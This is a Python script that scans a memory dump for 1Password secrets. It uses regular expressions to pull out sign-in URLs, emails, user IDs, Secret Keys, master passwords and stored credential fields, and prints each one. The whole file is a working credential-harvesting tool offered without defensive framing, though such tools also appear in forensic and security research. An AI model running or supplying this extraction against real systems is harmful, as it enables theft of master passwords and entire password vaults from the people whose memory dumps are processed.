import json
import os
import re
import string
import sys


def get_printable(file_path: str):
    with open(file_path, "rb") as f:
        non_printable = re.compile(b'[^%s]+' % re.escape(string.printable.encode('ascii')))
        for result in non_printable.split(f.read()):
            if result:
                yield result.decode('ASCII')


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Incorrect Arguments")
        print("%s <PATH TO .DMP>" % os.path.sys.argv[0])
        exit(1)

    path = sys.argv[1]
    if not os.path.exists(path):
        print("Dump file does not exist")
        exit(1)

    path = os.path.abspath(path)

    print("Opening Dump File: %s" % path)
    printable = ""
    for s in get_printable(path):
        printable += s

    # Search for 1Password Credential Information
    pattern = re.compile(
        "\{\"title\":\".*\",\"url\":\"(.*)\",\"ainfo\":\"(.*)\",\"ps\":.*,\"pbe\":.*,\"pgrng\":.*,\"URLs\":\[\{\"l\":\".*\",\"u\":\"(.*)\"\}\],\"b5UserUUID\":\"(.*)\",\"tags\":\[(.*)]\}")
    for match in re.findall(pattern, printable):
        url_a, email, url_b, user_id, rank = match
        print("Potential 1Password Credentials")

        print("\tPotential Sign In URL: " + url_a)
        if url_b not in url_a:
            print("\tPotential Sign In URL: " + url_b)

        print("\tPotential Sign In Email: " + email)
        print("\tPotential User ID: " + user_id)
        print("\tPotential Subscription Rank: " + rank)

    # Search for Secret Keys
    potential_secret_keys = []
    pattern = re.compile("\"(.{2}-.{6}-.{6}-.{5}-.{5}-.{5}-.{5})\"")
    for key in re.findall(pattern, printable):
        if key not in potential_secret_keys:
            print("\tPotential Secret Key: " + key)
            potential_secret_keys.append(key)

    # Search for Master Passwords
    potential_master_passwords = []
    pattern = re.compile(
        "{\"name\":\"master-password\",\"value\":\"(.*)\",\"type\":\"P\",\"designation\":\"password\"}")

    for password in re.findall(pattern, printable):
        if password not in potential_master_passwords:
            print("\tPotential Master Password: " + password)
            potential_master_passwords.append(password)

    # Search for Account Credentials
    potential_credentials = []
    pattern = re.compile("{\"fields\":\[\{.*\}\]}")
    for a in re.findall(pattern, printable):
        jsons = json.loads(a)
        if jsons not in potential_credentials:
            print("Potential Credentials : " + json.dumps(jsons, indent=4, sort_keys=True))
            potential_credentials.append(jsons)

    print("Found %s Potential Credentials" % len(potential_credentials))
    print("Finished")
